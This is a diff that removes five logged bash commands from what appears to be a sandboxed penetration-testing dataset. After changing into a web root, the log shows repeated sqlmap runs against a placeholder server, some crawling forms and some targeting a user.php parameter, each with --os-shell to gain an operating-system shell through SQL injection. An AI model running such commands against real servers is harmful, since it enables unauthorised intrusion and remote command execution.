@@ -1,5 +1,0 @@
-{"sandbox_id": "135", "timestamp_str": "2021-01-14T10:20:25.095Z", "cmd_type": "bash-command", "cmd": "cd var/www/html"}
-{"sandbox_id": "135", "timestamp_str": "2021-01-14T10:21:50.910Z", "cmd_type": "bash-command", "cmd": "sqlmap -u http://server/ --os-shell"}
-{"sandbox_id": "135", "timestamp_str": "2021-01-14T10:22:40.532Z", "cmd_type": "bash-command", "cmd": "sqlmap -u http://server/ --forms --crawl=2 --os-shell"}
-{"sandbox_id": "135", "timestamp_str": "2021-01-14T10:25:05.607Z", "cmd_type": "bash-command", "cmd": "sqlmap -u http://server/user.php?user=admin --os-shell"}
-{"sandbox_id": "135", "timestamp_str": "2021-01-14T10:29:37.366Z", "cmd_type": "bash-command", "cmd": "sqlmap -u http://server/user.php?user=admin --os-shell"}
